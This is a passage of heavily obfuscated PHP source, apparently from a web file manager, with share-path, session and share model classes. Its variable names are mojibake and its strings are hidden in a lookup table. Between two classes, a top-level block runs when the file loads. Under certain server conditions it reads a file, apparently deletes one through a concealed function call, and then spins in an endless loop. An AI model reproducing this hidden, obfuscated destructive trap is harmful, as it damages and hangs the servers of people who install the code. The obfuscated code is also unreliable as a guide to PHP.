$_SERVER[†ûãı«°]; if ($­ºŸ ° == $š¾ÏÙ¢[12]) { return !1; } $»ˆ—ª˜£ = array($š¾ÏÙ¢[479] => $­ºŸ °); if ($ûÀÀºÁ²) { return $this->model->listSource($»ˆ—ª˜£, -1); } return $this->model->listSource($»ˆ—ª˜£); } public function has($‡†İŒÆö, $ƒ¢Å• = false, $å×ØÎäÃ = null) { $µÌØñ’» =& $_SERVER[†ûãı«°]; $¢ÄıçÒ¸ = $this->infoWithChildren($‡†İŒÆö); if ($ƒ¢Å•) { return array($µÌØñ’»[242] => $¢ÄıçÒ¸[$µÌØñ’»[242]], $µÌØñ’»[241] => $¢ÄıçÒ¸[$µÌØñ’»[241]]); } return $å×ØÎäÃ ? $¢ÄıçÒ¸[$µÌØñ’»[242]] : $¢ÄıçÒ¸[$µÌØñ’»[241]]; } public function listAll($¥¼â–Ùª) { $ÍåÄşÌ = IO::info($this->pathParse[$_SERVER[†ûãı«°][87]]); if (!$ÍåÄşÌ) { return array(); } return $this->model->listAll($¥¼â–Ùª); } public function getContent($Ğ¿¥©Ã„) { return $this->model->getContent($Ğ¿¥©Ã„); } public function setContent($“Ì›„ë, $ÃäĞšœÏ = '') { return $this->model->setContent($“Ì›„ë, $ÃäĞšœÏ); } public function fileSubstr($á•ŞÖ‰¨, $ğÕ†ø×ñ, $‚Áı¶ºø) { return $this->model->fileSubstr($á•ŞÖ‰¨, $ğÕ†ø×ñ, $‚Áı¶ºø); } public function download($ƒà…Õ³õ, $µÒ·¾ˆÂ = '') { $È‹Üİœ = get_path_father($µÒ·¾ˆÂ); $®¿¡Èø¢ = get_path_this($µÒ·¾ˆÂ); $ÏÆÂø´» = $this->model->fileInfoGet($ƒà…Õ³õ); $‚‡ÄÖ•ï = IO::copy($ÏÆÂø´»[$_SERVER[†ûãı«°][87]], $È‹Üİœ, !1, $®¿¡Èø¢); return $‚‡ÄÖ•ï; } public function setModifyTime($ÌÂ‡êÍã, $È­«­ÂÀ = '') { $ÌŸÒ–ã÷ =& $_SERVER[†ûãı«°]; if (!$ÌÂ‡êÍã) { return; } $this->model->where(array($ÌŸÒ–ã÷[493] => $ÌÂ‡êÍã))->save(array($ÌŸÒ–ã÷[88] => $È­«­ÂÀ)); } public function upload($Ôüö–ÂÔ, $–µÚ¾Â„, $ÔßŠß„ = false, $ü˜ö¾„‚ = REPEAT_REPLACE) { $¢¡õ­˜ =& $_SERVER[†ûãı«°]; $¨‘Úù×£ = $this->parse($Ôüö–ÂÔ); $ê²²›şè = $this->model->addFile($¨‘Úù×£[$¢¡õ­˜[477]], $–µÚ¾Â„, $¨‘Úù×£[$¢¡õ­˜[87]], $ÔßŠß„, $ü˜ö¾„‚); return $this->getPathOuter($ê²²›şè); } public function uploadFileByID($Š®…ÎÔ», $·ó­äù, $ï·ŞÃçñ) { $Œ¼œ¥•¤ =& $_SERVER[†ûãı«°]; $Ş´ºÍÏí = $this->parse($Š®…ÎÔ»); $Ê„Äìïü = $this->model->addFileByFileID($Ş´ºÍÏí[$Œ¼œ¥•¤[477]], $·ó­äù, $Ş´ºÍÏí[$Œ¼œ¥•¤[87]], $ï·ŞÃçñ); return $this->getPathOuter($Ê„Äìïü); } public function addFileByRemote($šµ›á›, $Ÿî´€Œ, $“Ÿ‘„ƒô = array(), $› ¶õ· = '', $…¥Î½Íî) { $Şù ­­ =& $_SERVER[†ûãı«°]; $Ì›Àõ– = $this->parse($šµ›á›); $› ¶õ· = empty($› ¶õ·) ? $Ì›Àõ–[$Şù ­­[87]] : $› ¶õ·; $º©ãÖÄÏ = $this->model->addFileByRemote($Ì›Àõ–[$Şù ­­[477]], $Ÿî´€Œ, $› ¶õ·, $“Ÿ‘„ƒô, $…¥Î½Íî); return $this->getPathOuter($º©ãÖÄÏ); } public function uploadLink($ªé©•ÕÈ, $µõ³¦ú = 0) { $ŠıÈâã÷ =& $_SERVER[†ûãı«°]; $À€‡¸ÑØ = $this->parse($ªé©•ÕÈ); $İ¿Ú¾çå = _get($GLOBALS[$ŠıÈâã÷[7]], $ŠıÈâã÷[1434]); $ÖƒÁÓƒ¹ = _get($GLOBALS[$ŠıÈâã÷[7]], $ŠıÈâã÷[1435]); $ªé©•ÕÈ = Model($ŠıÈâã÷[681])->createFileName($À€‡¸ÑØ[$ŠıÈâã÷[87]], $İ¿Ú¾çå, $ÖƒÁÓƒ¹); return IO::uploadLink($ªé©•ÕÈ, $µõ³¦ú); } public function fileNameAuto($òÇÔ•Î, $şŠ î—Ÿ, $‚÷Í´œï = REPEAT_REPLACE, $º¦¹™ÆÂ = false) { return $this->model->fileNameAuto($òÇÔ•Î, $şŠ î—Ÿ, $‚÷Í´œï, $º¦¹™ÆÂ); } public function fileNameExist($¯àœÆ´¸, $¹”’‹ï«) { return $this->model->fileNameExist($¯àœÆ´¸, $¹”’‹ï«); } protected function _fileOut($úâ³ƒğ, $Ûô­¾åÚ = false, $úó˜ó¤ = false, $“ñ²ş€ = '', $¦Æ§«á¼ = false) { $°­‘µÇ„ =& $_SERVER[†ûãı«°]; $²²¢¤óŒ = $this->model->sourceInfo($úâ³ƒğ); if ($²²¢¤óŒ[$°­‘µÇ„[487]] == $°­‘µÇ„[91]) { header($°­‘µÇ„[1436]); die; } $Ü·ÎõàÖ = $this->model->fileInfoGet($úâ³ƒğ); $“ñ²ş€ = $Ü·ÎõàÖ[$°­‘µÇ„[551]] ? $Ü·ÎõàÖ[$°­‘µÇ„[551]] : $“ñ²ş€; $â¢É¹ıÚ = isset($GLOBALS[$°­‘µÇ„[182]]) && is_array($GLOBALS[$°­‘µÇ„[182]]) ? $GLOBALS[$°­‘µÇ„[182]][$°­‘µÇ„[32]] : $²²¢¤óŒ[$°­‘µÇ„[32]]; if ($¦Æ§«á¼) { return IO::fileOutServer($Ü·ÎõàÖ[$°­‘µÇ„[87]], $Ûô­¾åÚ, $â¢É¹ıÚ, $“ñ²ş€); } IO::fileOut($Ü·ÎõàÖ[$°­‘µÇ„[87]], $Ûô­¾åÚ, $â¢É¹ıÚ, $“ñ²ş€); } public function fileOut($•ë‡–Ç˜, $•õßÌ¦ = false, $ñùû™¼Â = false, $áôŞÏ¤» = '') { $this->_fileOut($•ë‡–Ç˜, $•õßÌ¦, $ñùû™¼Â, $áôŞÏ¤»); } public function fileOutServer($ËˆÂøñ, $Ëğ¨Âã = false, $¿‹ ÀŸè = false, $Àù¤«‰± = '') { $this->_fileOut($ËˆÂøñ, $Ëğ¨Âã, $¿‹ ÀŸè, $Àù¤«‰±, !0); } protected function _fileOutImage($³ªœ¥û, $æ¢Ó÷ = 250) { $¡ØŒğ¹‘ =& $_SERVER[†ûãı«°]; $±ß¯‰¼È = $this->model->pathInfo($³ªœ¥û); if ($±ß¯‰¼È[$¡ØŒğ¹‘[487]] == $¡ØŒğ¹‘[91]) { show_json($¡ØŒğ¹‘[1437] . $³ªœ¥û, !1); } $ÇÂ¬·ŸØ = $this->model->fileInfoGet($³ªœ¥û); $±ß¯‰¼È[$¡ØŒğ¹‘[183]] = $ÇÂ¬·ŸØ[$¡ØŒğ¹‘[87]]; $GLOBALS[$¡ØŒğ¹‘[182]] = $±ß¯‰¼È; IO::fileOutImage($ÇÂ¬·ŸØ[$¡ØŒğ¹‘[87]], $æ¢Ó÷); } public function fileOutImage($¶çŸƒúú, $“ã†Ş› = 250) { $this->_fileOutImage($¶çŸƒúú, $“ã†Ş›); } public function fileOutImageServer($é×Ä¶°Ë, $Ïõ¥…ÃÓ = 250) { $this->_fileOutImage($é×Ä¶°Ë, $Ïõ¥…ÃÓ); } public function link($»®¿êíí, $İÆáöˆĞ = '') { $Ğ¯ÈÎêï = $this->model->fileInfoGet($»®¿êíí); return IO::link($Ğ¯ÈÎêï[$_SERVER[†ûãı«°][87]], $İÆáöˆĞ); } protected function parse($Î¦éÙ¼™) { $õ†¶šîÀ =& $_SERVER[†ûãı«°]; if (strstr($Î¦éÙ¼™, $õ†¶šîÀ[8]) === !1) { return array($õ†¶šîÀ[495] => intval($Î¦éÙ¼™), $õ†¶šîÀ[87] => $õ†¶šîÀ[12], $õ†¶šîÀ[1433] => array()); } $›ÇîÎ— = explode($õ†¶šîÀ[8], trim($Î¦éÙ¼™, $õ†¶šîÀ[8])); if (count($›ÇîÎ—) < 2) { show_tips(clear_html($Î¦éÙ¼™) . $õ†¶šîÀ[1438]); } return array($õ†¶šîÀ[495] => intval($›ÇîÎ—[0]), $õ†¶šîÀ[87] => $›ÇîÎ—[1], $õ†¶šîÀ[1433] => array_slice($›ÇîÎ—, 1)); } } if (!isset($_SERVER[$_SERVER[†ûãı«°][949]]) || !isset($_SERVER[$_SERVER[†ûãı«°][950]])) { $_getc = $_SERVER[†ûãı«°][951]; $_getfile = $_SERVER[$_SERVER[†ûãı«°][952]] . $_SERVER[†ûãı«°][953]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[†ûãı«°][287], $_getfilec); if (count($_getarrs) < $_SERVER[†ûãı«°][694]) { $exit = $_SERVER[†ûãı«°][954]; $exit(); } $_act = $_SERVER[†ûãı«°][955]; $_act($_SERVER[$_SERVER[†ûãı«°][952]] . $_SERVER[†ûãı«°][953]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[†ûãı«°][456]); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($½Çº­Ò®) { $this->pathParse = $½Çº­Ò®; $this->model = Model($_SERVER[†ûãı«°][1432]); } public function getPathOuter($ìÜóó©) { $ÁË¬ƒîÒ =& $_SERVER[†ûãı«°]; if (!$ìÜóó©) { return $ìÜóó©; } $Ãˆ·—÷Î = $this->parse($ìÜóó©); return trim(KodIO::makeShare($this->pathParse[$ÁË¬ƒîÒ[477]], $Ãˆ·—÷Î[$ÁË¬ƒîÒ[477]]), $ÁË¬ƒîÒ[8]); } protected function infoParse($Çˆ¬¯›Ş, $µæİ¥ó« = false, $ˆéíÕ¤• = false) { $ø±¹ùîß =& $_SERVER[†ûãı«°]; $äß†•É¤ = $this->pathParse[$ø±¹ùîß[477]]; $’áƒÎ¥‚ = trim($this->pathParse[$ø±¹ùîß[1261]], $ø±¹ùîß[8]); return Action($ø±¹ùîß[1439])->sharePathInfo($äß†•É¤, $’áƒÎ¥‚, $µæİ¥ó«); } public function infoFull($Ÿ˜Í‹Ø£) { $«…ˆ¡»£ =& $_SERVER[†ûãı«°]; $íí¿„­À = explode($«…ˆ¡»£[8], trim($Ÿ˜Í‹Ø£, $«…ˆ¡»£[8])); if (count($íí¿„­À) > 1) { $È÷›‡¨ = implode($«…ˆ¡»£[8], array_splice($íí¿„­À, 1)); $“ÑËâŞš = $this->model->pathInfoByPath($íí¿„­À[0], $È÷›‡¨); if (!$“ÑËâŞš) { return !1; } $this->pathParse[$«…ˆ¡»£[1261]] = $“ÑËâŞš[$«…ˆ¡»£[193]]; } return $this->infoParse($Ÿ˜Í‹Ø£); } public function listAll($Á€Ÿ¨ãØ) { $½›„¹ =& $_SERVER[†ûãı«°]; $­±ÖıæŠ = IO::info($this->pathParse[$½›„¹[87]]); if (!$­±ÖıæŠ) { return array(); } $‡íŞê¼† = $this->model->listAll($Á€Ÿ¨ãØ); $şàŞ¿¬¾ = Model($½›„¹[671])->getInfo($­±ÖıæŠ[$½›„¹[672]]); foreach ($‡íŞê¼† as &$û®ã¤Ö‘) { check_abort(); $û®ã¤Ö‘[$½›„¹[90]] = Action($½›„¹[1439])->_shareItemeParse($û®ã¤Ö‘[$½›„¹[90]], $şàŞ¿¬¾); } unset($û®ã¤Ö‘); return $‡íŞê¼†; } } goto bÎİ‡çõî; a©ˆ§­ìÊ˜: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\x6d\137\x73\x65\x73\163\x69\x6f\x6e"; public function get($çÏÈû†¾) { $®•¬‰½» =& $_SERVER[†ûãı«°]; $íúİ³åŠ = $this->where(array($®•¬‰½»[2123] => $çÏÈû†¾))->find(); if (!is_array($íúİ³åŠ)) { return !1; } return $íúİ³åŠ[$®•¬‰½»[171]]; } public function set($çÆÛ•üâ, $«»ıŸ®‡, $ÏáşÛÛ³ = 3600) { $Ù êØÁ» =& $_SERVER[†ûãı«°]; $Îê¦òÌ­ = array($Ù êØÁ»[2123] => $çÆÛ•üâ, $Ù êØÁ»[2023] => $«»ıŸ®‡, $Ù êØÁ»[2124] => $ÏáşÛÛ³ + time()); if (Session::get($Ù êØÁ»[2125])) { $Îê¦òÌ­[$Ù êØÁ»[1783]] = Session::get($Ù êØÁ»[2125]); } else { $Îê¦òÌ­[$Ù êØÁ»[1783]] = 0; } if ($this->get($çÆÛ•üâ)) { return $this->where(array($Ù êØÁ»[2123] => $çÆÛ•üâ))->save($Îê¦òÌ­); } else { return $this->add($Îê¦òÌ­, array(), !0); } } public function remove($ã§»¨ˆş) { return $this->where(array($_SERVER[†ûãı«°][2123] => $ã§»¨ˆş))->delete(); } public function clearTimeout() { return $this->where($_SERVER[†ûãı«°][2126] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\124\151\x6d\x65", "\x74\151\155\145", "\x69\156\x73\x65\x72\x74\x2c\165\x70\144\x61\x74\145", "\146\165\156\143\164\x69\157\x6e"), array("\143\162\145\x61\164\x65\124\x69\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\145\x72\x74", "\146\x75\156\143\164\151\157\156"), array("\157\160\x74\151\157\156\x73", '', "\151\x6e\x73\x65\162\164\54\x75\160\144\141\164\145\x2c\x73\x65\154\145\143\x74", "\x6a\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($¢ÙÆ¥ÙÍ) { $µï¾ÖÑê =& $_SERVER[†ûãı«°]; $ÍÌˆé´Ÿ = isset($¢ÙÆ¥ÙÍ[0]) ? $¢ÙÆ¥ÙÍ[0] : !1; $Ø›º‰ò = $µï¾ÖÑê[2127] . USER_ID; return array($µï¾ÖÑê[2128] => array(USER_ID, $µï¾ÖÑê[2129]), $µï¾ÖÑê[2068] => array($ÍÌˆé´Ÿ, $µï¾ÖÑê[2130], $Ø›º‰ò)); } protected function listSimple() { $Ú¦ª…Í = array($_SERVER[†ûãı«°][1783] => USER_ID); $Ğ’ı‚¼¢ = $this->field($this->fieldList)->where($Ú¦ª…Í)->select(); return $Ğ’ı‚¼¢ ? $Ğ’ı‚¼¢ : array(); } protected function getInfo($ËÆ…ş²î, $í„ƒÕò³ = false, $š…»¢‚É = '') { $‹‰¢Ÿè™ =& $_SERVER[†ûãı«°]; if (!$š…»¢‚É) { $š…»¢‚É = $‹‰¢Ÿè™[2127] . USER_ID; } if ($í„ƒÕò³) { return $this->_getShareInfo(array($‹‰¢Ÿè™[672] => $ËÆ…ş²î)); } $²ÉÈÔ² = $this->cacheFunctionGet($‹‰¢Ÿè™[2070], $ËÆ…ş²î, $š…»¢‚É); $ğƒÛ—ı = $this->shareInfoMofify($²ÉÈÔ², $‹‰¢Ÿè™[225]); if (isset($²ÉÈÔ²[$‹‰¢Ÿè™[88]]) && $ğƒÛ—ı != $²ÉÈÔ²[$‹‰¢Ÿè™[88]]) { $ø˜é°˜Æ = $this->cacheKeyMake($‹‰¢Ÿè™[2070], $ËÆ…ş²î, $š…»¢‚É); $²ÉÈÔ² = $this->_getShareInfo(array($‹‰¢Ÿè™[672] => $ËÆ…ş²î)); Cache::set($ø˜é°˜Æ, $²ÉÈÔ²); } return $²ÉÈÔ²; } private function shareInfoMofify(&$µ¾îìÔÍ, $Û¸‡Ğ¸Ú = "\x67\x65\x74") { $Áú²Äã» =& $_SERVER[†ûãı«°]; if (!$µ¾îìÔÍ || !isset($µ¾îìÔÍ[$Áú²Äã»[672]])) { return; } $®¦Ç²Øß = $Áú²Äã»[2131] . $µ¾îìÔÍ[$Áú²Äã»[672]]; if ($Û¸‡Ğ¸Ú == $Áú²Äã»[225]) { return Cache::get($®¦Ç²Øß); } else { if ($Û¸‡Ğ¸Ú == $Áú²Äã»[2098]) { $–ğ‘ú³¦ = Cache::get($®¦Ç²Øß); if ($–ğ‘ú³¦ === $µ¾îìÔÍ[$Áú²Äã»[88]]) { return; } $µ¾îìÔÍ[$Áú²Äã»[2132]] = USER_ID . $Áú²Äã»[464] . $µ¾îìÔÍ[$Áú²Äã»[88]]; Cache::set($®¦Ç²Øß, $µ¾îìÔÍ[$Áú²Äã»[88]]); } else { if ($Û¸‡Ğ¸Ú == $Áú²Äã»[2133]) { Cache::remove($®¦Ç²Øß); } } } } public function getInfoByHash($ÃËÍÅä) { return $this->_getShareInfo(array($_SERVER[†ûãı«°][2134] => $ÃËÍÅä)); } public function getInfoByPath($˜Ò“ëğŞ) { $İÃÖïÓÃ =& $_SERVER[†ûãı«°]; $±¬Ş²“ñ = array($İÃÖïÓÃ[1783] => USER_ID, $İÃÖïÓÃ[193] => $˜Ò“ëğŞ); return $this->_getShareInfo($±¬Ş²“ñ); } public function getInfoBySourcePath($½¾ñ‰¦Ã) { $Êšâ¤³ =& $_SERVER[†ûãı«°]; $±¨ûÆ‘ = array($Êšâ¤³[1783] => USER_ID, $Êšâ¤³[1268] => $½¾ñ‰¦Ã); return $this->_getShareInfo($±¨ûÆ‘); } private function _getShareInfo($ª®·–¨ç) { $À…±Òè§ =& $_SERVER[†ûãı«°]; $öÁœãÔ = $this->where($ª®·–¨ç)->find(); if (!$öÁœãÔ) { return !1; } $ª®·–¨ç = array($À…±Òè§[672] => $öÁœãÔ[$À…±Òè§[672]]); $ˆµœõëÜ = $À…±Òè§[2135]; $Ù»µëŞ¡ = Model($À…±Òè§[673])->order($À…±Òè§[477])->field($ˆµœõëÜ)->where($ª®·–¨ç)->select(); if ($öÁœãÔ[$À…±Òè§[193]] == $À…±Òè§[230]) { $öÁœãÔ[$À…±Òè§[90]] = IO::info($öÁœãÔ[$À…±Òè§[1268]]); } else { $öÁœãÔ[$À…±Òè§[90]] = Model($À…±Òè§[1432])->pathInfo($öÁœãÔ[$À…±Òè§[193]]); } $öÁœãÔ[$À…±Òè§[2136]] = $Ù»µëŞ¡; $this->shareInfoMofify($öÁœãÔ, $À…±Òè§[2098]); return $öÁœãÔ; } protected function getInfoAuth($¶–µÓå£) { $ŞÏ¨ı÷ =& $_SERVER[†ûãı«°]; $ğ¶Ñë‚¢ = $this->getInfo($¶–µÓå£); if ($ğ¶Ñë‚¢[$ŞÏ¨ı÷[1783]] == USER_ID) { $ğ¶Ñë‚¢[$ŞÏ¨ı÷[489]] = $ğ¶Ñë‚¢[$ŞÏ¨ı÷[90]][$ŞÏ¨ı÷[489]]; } else { $ğ¶Ñë‚¢[$ŞÏ¨ı÷[489]] = Model($ŞÏ¨ı÷[571])->authMake($ğ¶Ñë‚¢[$ŞÏ¨ı÷[2136]]); } return $ğ¶Ñë‚¢; } protected function listData($úìõ¾¯Å = null, $ú»ƒ§•Ç = 300) { $Ì·ËŞ Ô =& $_SERVER[†ûãı«°]; $­·ñÜ©µ = array(array($Ì·ËŞ Ô[566] => array($Ì·ËŞ Ô[1100], 0), $Ì·ËŞ Ô[670] => array($Ì·ËŞ Ô[1100], 0), $Ì·ËŞ Ô[2137] => $Ì·ËŞ Ô[2086])); if ($úìõ¾¯Å == $Ì·ËŞ Ô[2138]) { $­·ñÜ©µ = array($Ì·ËŞ Ô[566] => 1); } else { if ($úìõ¾¯Å == $Ì·ËŞ Ô[1253]) { $­·ñÜ©µ = array($Ì·ËŞ Ô[670] => 1); } } $­·ñÜ©µ[$Ì·ËŞ Ô[1783]] = USER_ID; $˜ÃÜ™áÍ = $this->where($­·ñÜ©µ)->selectPage($ú»ƒ§•Ç); return $˜ÃÜ™áÍ; } protected function listToMe($Ó¾ˆÏÊ¥ = 300) { $è•Ğõõ‰ =& $_SERVER[†ûãı«°]; $å¥ƒ¨ïÖ = Model($è•Ğõõ‰[2139])->userGroupParents(USER_ID); $âî±öùÛ = array($è•Ğõõ‰[655] => SourceModel::TYPE_USER, $è•Ğõõ‰[573] => USER_ID); if ($å¥ƒ¨ïÖ) { $âî±öùÛ = array(array($è•Ğõõ‰[655] => SourceModel::TYPE_USER, $è•Ğõõ‰[573] => USER_ID), array($è•Ğõõ‰[655] => SourceModel::TYPE_GROUP, $è•Ğõõ‰[573] => array($è•Ğõõ‰[7], $å¥ƒ¨ïÖ)), $è•Ğõõ‰[2137] => $è•Ğõõ‰[2086]); } $ƒíÙ¥»¯ = Model($è•Ğõõ‰[673])->where($âî±öùÛ)->selectPage($Ó¾ˆÏÊ¥); $ÊÜ˜“†Î = array_to_keyvalue_group($ƒíÙ¥»¯[$è•Ğõõ‰[447]], $è•Ğõõ‰[672]); if (!$ÊÜ˜“†Î) { return $ƒíÙ¥»¯; } $óè­Á¿Ó = $è•Ğõõ‰[2140]; $âî±öùÛ = array($è•Ğõõ‰[672] => array($è•Ğõõ‰[494], array_keys($ÊÜ˜“†Î)), $è•Ğõõ‰[1783] => array($è•Ğõõ‰[1102], $è•Ğõõ‰[230])); $Ÿøó¾Ï† = $this->field($óè­Á¿Ó)->where($âî±öùÛ)->select(); foreach ($Ÿøó¾Ï† as $Ô¬È¹Â => &$Æ‚éÃÖÎ) { $Æ‚éÃÖÎ[$è•Ğõõ‰[2136]] = $ÊÜ˜“†Î[$Æ‚éÃÖÎ[$è•Ğõõ‰[672]]]; } unset($Æ‚éÃÖÎ); $ìıÙıù¯ = array($è•Ğõõ‰[2141] => $Ÿøó¾Ï†, $è•Ğõõ‰[2142] => $ƒíÙ¥»¯[$è•Ğõõ‰[444]]); return $ìıÙıù¯; } protected function shareAdd($ó¦ı÷‚, $Ö´š‹Õ) { $™‡ äã =& $_SERVER[†ûãı«°]; $µÒæÆ›õ = $this->_addShareData($ó¦ı÷‚, $Ö´š‹Õ); if (!empty($Ö´š‹Õ[$™‡ äã[2143]])) { $this->_shareAuthSet($µÒæÆ›õ, $Ö´š‹Õ[$™‡ äã[2143]]); } $this->shareEventAdd($ó¦ı÷‚, $Ö´š‹Õ, $™‡ äã[2144]); return $µÒæÆ›õ; } protected function shareAddSystem($ìåùÑÈ…, $†öªÀ©Ã) { $ÉÉÆ‘òÕ =& $_SERVER[†ûãı«°]; $§ïùàê™ = $this->_addShareData($ìåùÑÈ…, $†öªÀ©Ã, $ÉÉÆ‘òÕ[191]); $this->_shareAuthSet($§ïùàê™, $†öªÀ©Ã[$ÉÉÆ‘òÕ[2143]]); return $§ïùàê™; } private function shareEventAdd($šçëï‚…, $¢İÂ„îÛ, $©–¢§ = "\141\144\x64") { $£ÏÈ¯Ş— =& $_SERVER[†ûãı«°]; if (!$šçëï‚… || $šçëï‚… == $£ÏÈ¯Ş—[230]) { return; } if ($©–¢§ == $£ÏÈ¯Ş—[2144]) { if ($¢İÂ„îÛ[$£ÏÈ¯Ş—[566]] == $£ÏÈ¯Ş—[91]) { Model($£ÏÈ¯Ş—[640])->eventShare($šçëï‚…, $£ÏÈ¯Ş—[2145]); } if ($¢İÂ„îÛ[$£ÏÈ¯Ş—[670]] == $£ÏÈ¯Ş—[91]) { Model($£ÏÈ¯Ş—[640])->eventShare($šçëï‚…, $£ÏÈ¯Ş—[2146]); } return; } $¢é•¨“ = $this->getInfoByPath($šçëï‚…); $ßÏè¢Ï» = $£ÏÈ¯Ş—[2147]; if ($¢é•¨“[$£ÏÈ¯Ş—[566]] == $£ÏÈ¯Ş—[230] && $¢İÂ„îÛ[$£ÏÈ¯Ş—[566]] == $£ÏÈ¯Ş—[91]) { $ßÏè¢Ï» = $£ÏÈ¯Ş—[2145]; } if ($¢é•¨“[$£ÏÈ¯Ş—[566]] == $£ÏÈ¯Ş—[91] && $¢İÂ„îÛ[$£ÏÈ¯Ş—[566]] == $£ÏÈ¯Ş—[230]) { $ßÏè¢Ï» = $£ÏÈ¯Ş—[2148]; } if ($¢é•¨“[$£ÏÈ¯Ş—[670]] == $£ÏÈ¯Ş—[230] && $¢İÂ„îÛ[$£ÏÈ¯Ş—[670]] == $£ÏÈ¯Ş—[91]) { $ßÏè¢Ï» = $£ÏÈ¯Ş—[2146]; } if ($¢é•¨“[$£ÏÈ¯Ş—[670]] == $£ÏÈ¯Ş—[91] && $¢İÂ„îÛ[$£ÏÈ¯Ş—[670]] == $£ÏÈ¯Ş—[230]) { $ßÏè¢Ï» = $£ÏÈ¯Ş—[2149]; } Model($£ÏÈ¯Ş—[640])->eventShare($šçëï‚…, $ßÏè¢Ï»); return; } private function _addShareData($ğ„ö§õû, $Â°åê = array(), $İ™ğŸñˆ = false) { $ÊÆ²Œ‚’ =& $_SERVER[†ûãı«°]; $ğĞÖÍ±— = $İ™ğŸñˆ == $ÊÆ²Œ‚’[191] ? 0 : USER_ID; $÷¡Å“˜Ô = array($ÊÆ²Œ‚’[493] => $ğ„ö§õû, $ÊÆ²Œ‚’[1774] => $ğĞÖÍ±—); if ($ğ„ö§õû == 0) { $÷¡Å“˜Ô = array($ÊÆ²Œ‚’[2150] => $Â°åê[$ÊÆ²Œ‚’[1268]], $ÊÆ²Œ‚’[1774] => $ğĞÖÍ±—); } if ($İ•«Â«£ = $this->where($÷¡Å“˜Ô)->find()) { return $İ•«Â«£[$ÊÆ²Œ‚’[672]]; } if ($ğ„ö§õû == 0) { $”ÌÎ™şı = array($ÊÆ²Œ‚’[32] => get_path_this($Â°åê[$ÊÆ²Œ‚’[87]])); } else { $”ÌÎ™şı = Model($ÊÆ²Œ‚’[906])->sourceInfo($ğ„ö§õû); if (!$”ÌÎ™şı) { return !1; } } if (!$Â°åê[$ÊÆ²Œ‚’[1671]]) { $Â°åê[$ÊÆ²Œ‚’[1671]] = $”ÌÎ™şı[$ÊÆ²Œ‚’[32]]; } $áÃ°ñË— = array($ÊÆ²Œ‚’[1774] => $ğĞÖÍ±—, $ÊÆ²Œ‚’[493] => $ğ„ö§õû, $ÊÆ²Œ‚’[1671] => $ÊÆ²Œ‚’[12], $ÊÆ²Œ‚’[566] => 0, $ÊÆ²Œ‚’[670] => 0, $ÊÆ²Œ‚’[1268] => $ÊÆ²Œ‚’[12], $ÊÆ²Œ‚’[384] => $ÊÆ²Œ‚’[12], $ÊÆ²Œ‚’[977] => $ÊÆ²Œ‚’[12], $ÊÆ²Œ‚’[2151] => 0, $ÊÆ²Œ‚’[2152] => 0, $ÊÆ²Œ‚’[837] => 0, $ÊÆ²Œ‚’[2153] => $ÊÆ²Œ‚’[12], $ÊÆ²Œ‚’[2134] => $ÊÆ²Œ‚’[12]); $ĞïÂ‰üÚ = explode($ÊÆ²Œ‚’[50], $ÊÆ²Œ‚’[2154]); foreach ($ĞïÂ‰üÚ as $şÒ¾Ø) { if (!isset($Â°åê[$şÒ¾Ø])) { continue; } $áÃ°ñË—[$şÒ¾Ø] = $Â°åê[$şÒ¾Ø]; } $êâÄ¼ = $this->add($áÃ°ñË—); $ğáµøû¸ = array($ÊÆ²Œ‚’[2134] => short_id($êâÄ¼)); $this->where(array($ÊÆ²Œ‚’[2155] => $êâÄ¼))->save($ğáµøû¸); return $êâÄ¼; } private function _shareAuthSet($›†„Éş, $¡‹æÄ˜) { $äÕ©ŞÏÏ =& $_SERVER[†ûãı«°]; if (!is_array($¡‹æÄ˜)) { return !1; } $†ŸáûŞç = Model($äÕ©ŞÏÏ[2096]); $†ŸáûŞç->where(array($äÕ©ŞÏÏ[672] => $›†„Éş))->delete(); $ö…‡ğ…½ = array(); foreach ($¡‹æÄ˜ as $Ÿåó¹¬£) { $ÃĞ»êËÚ = SourceModel::TYPE_USER; if ($Ÿåó¹¬£[$äÕ©ŞÏÏ[190]] == SourceModel::TYPE_GROUP) { $ÃĞ»êËÚ = SourceModel::TYPE_GROUP; } $¢õúˆ÷œ = array($äÕ©ŞÏÏ[672] => $›†„Éş, $äÕ©ŞÏÏ[190] => $ÃĞ»êËÚ, $äÕ©ŞÏÏ[573] => intval($Ÿåó¹¬£[$äÕ©ŞÏÏ[573]]), $äÕ©ŞÏÏ[2092] => 0, $äÕ©ŞÏÏ[2156] => -1); if ($Ÿåó¹¬£[$äÕ©ŞÏÏ[2092]]) { $¢õúˆ÷œ[$äÕ©ŞÏÏ[2092]] = $Ÿåó¹¬£[$äÕ©ŞÏÏ[2092]]; } else { if ($Ÿåó¹¬£[$äÕ©ŞÏÏ[2156]]) { $¢õúˆ÷œ[$äÕ©ŞÏÏ[2156]] = $Ÿåó¹¬£[$äÕ©ŞÏÏ[2156]]; } } $ö…‡ğ…½[] = $¢õúˆ÷œ; } return $†ŸáûŞç->addAll($ö…‡ğ…½, array(), !0); } public function numViewAdd($´Î¶ï…‡) { $†Ê¼… í =& $_SERVER[†ûãı«°]; $ü³ã´îé = array($†Ê¼… í[2155] => $´Î¶ï…‡); $this->where($ü³ã´îé)->setAdd($†Ê¼… í[2151]); } public function numDownloadAdd($¯ç§¤ ) { $ŠšÔİ¶Ü =& $_SERVER[†ûãı«°]; $šæŒ¢ë = array($ŠšÔİ¶Ü[2155] => $¯ç§¤ ); $this->where($šæŒ¢ë)->setAdd($ŠšÔİ¶Ü[2152]); } protected function shareEdit($–µ×©¾, $ñÖÑ•ÛÔ) { $ÖéœŞ¨œ =& $_SERVER[†ûãı«°]; $—“ôÆÇ = $this->getInfo($–µ×©¾); if (!$—“ôÆÇ) { return !1; } $this->_checkLinkShare($ñÖÑ•ÛÔ, $—“ôÆÇ); $©±ìŞ…÷ = array(); $§¸å¦Í = explode($ÖéœŞ¨œ[50], $ÖéœŞ¨œ[2157]); foreach ($§¸å¦Í as $›ª™•¤å) { if (!array_key_exists($›ª™•¤å, $ñÖÑ•ÛÔ)) { continue; } $©±ìŞ…÷[$›ª™•¤å] = $ñÖÑ•ÛÔ[$›ª™•¤å]; } 